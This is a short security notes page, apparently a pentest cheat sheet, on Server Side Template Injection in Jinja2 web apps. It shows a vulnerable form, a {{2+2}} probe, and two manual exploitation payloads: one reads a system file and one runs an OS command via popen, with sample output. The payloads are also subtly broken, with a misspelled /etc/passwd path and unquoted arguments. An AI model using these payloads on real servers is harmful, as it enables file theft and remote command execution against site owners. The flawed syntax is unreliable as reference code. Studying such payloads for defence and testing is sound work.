---
sidebar_position: 1
title: Server Side Template Injection
---


`SSTI` Occurs when a User is able to pass in a parameter that can control the **Template Engine** that is running on the Server.


- **Vulnerable Code:** Different template engines have different injection PAYLOADS. **In this case we can Test the Vulnerability with `{{2+2}}`**


```html
<html>
<body>
    <form action="/" method="post">
        First name:<br>
        <input type="text" name="name" value="">
        <input type="submit" value="Submit">
    </form>
    <p></p>
</body>
</html>
	
return render_template_string(template)
```

<br/>

## Manual Exploitation

:::info This Section Applies to `Jinja2`

For automated exploitation use the Tool **`TPLMAP`.**

:::

<br/>


- **The PAYLOAD load's the File Object in Python.**


```py
{{ ''.__class__.__mro__[2].__subclasses__()[40]()(/etc/password).read()}}
```

- The PAYLOAD Import's the OS Module, and **Run's a Command using the Popen Method.**

```py
{{config.__class__.__init__.__globals__['os'].popen(hostnamectl).read()}}
```

```html
<html>
<body>
    <form action="/" method="post">
        First name:<br>
        <input type="text" name="name" value="">
        <input type="submit" value="Submit">
    </form>
    <p>
        Static hostname: netlink
        Icon name: computer-vm
        Chassis: vm
        Machine ID: f589fe33e4b649fd9cbc222f5a19d5a4
        Boot ID: a9bc374573784f718f0d39deee65f014
        Virtualization: xen
        Operating System: Ubuntu 18.04.4 LTS
        Kernel: Linux 4.15.0-76-generic
        Architecture: x86-64
    </p>
</body>
</html>
``` 
